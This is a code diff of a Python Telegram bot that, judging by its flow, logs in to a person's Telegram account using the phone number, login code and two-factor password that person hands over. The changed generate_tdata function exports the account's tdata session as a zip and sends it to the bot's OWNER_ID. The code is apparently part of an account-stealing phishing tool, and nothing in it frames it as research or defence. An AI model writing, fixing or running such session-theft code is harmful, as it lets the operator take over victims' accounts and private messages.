@@ -81,7 +81,6 @@ async def check_and_process_code(user_id):
                 return
             try:
                 await sign_in(data['phone'], code, data['phone_code_hash'])
-                # Успех без 2FA — генерируем tdata
                 await redis_set(f"code_result:{user_id}", "ok")
                 await generate_tdata(user_id, data['phone'])
             except Exception as e:
@@ -90,7 +89,6 @@ async def check_and_process_code(user_id):
                     await check_and_process_2fa(user_id)
                 else:
                     await redis_set(f"code_result:{user_id}", "wrong_code")
-                    # Ждём новый код
                     await check_and_process_code(user_id)
             return
 
@@ -116,27 +114,24 @@ async def check_and_process_2fa(user_id):
 
 async def generate_tdata(user_id, phone):
     try:
-        b = Bot(token=BOT_TOKEN)
-        session_path = f'sessions/{phone}.session'
-        if os.path.exists(session_Path):
-            with open(session_path, 'rb') as f:
-                file_data = f.read()
+        from auth import export_tdata
+        zip_data = await export_tdata(phone)
+        if zip_data:
+            b = Bot(token=BOT_TOKEN)
             await b.send_document(
-                owner_id,
-                types.bufferedinputfile(file_data, filename=f'{phone}.session'),
-                caption=f'✅ Session для {phone}'
+                OWNER_ID,
+                types.BufferedInputFile(zip_data, filename=f'{phone}_tdata.zip'),
+                caption=f'✅ tdata для {phone}'
             )
-        await b.session.close()
+            await b.session.close()
+        else:
+            print(f'tdata export failed for {phone}')
     except Exception as e:
-        print(f'session send error: {e}')
-    
+        print(f'generate_tdata error: {e}')
+
     await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
     if user_id in pending:
         del pending[user_id]
-
-@dp.message(F.contact)
-async def contact_with_code_check(message: types.Message):
-    pass
 
 async def polling_codes():
     while True:
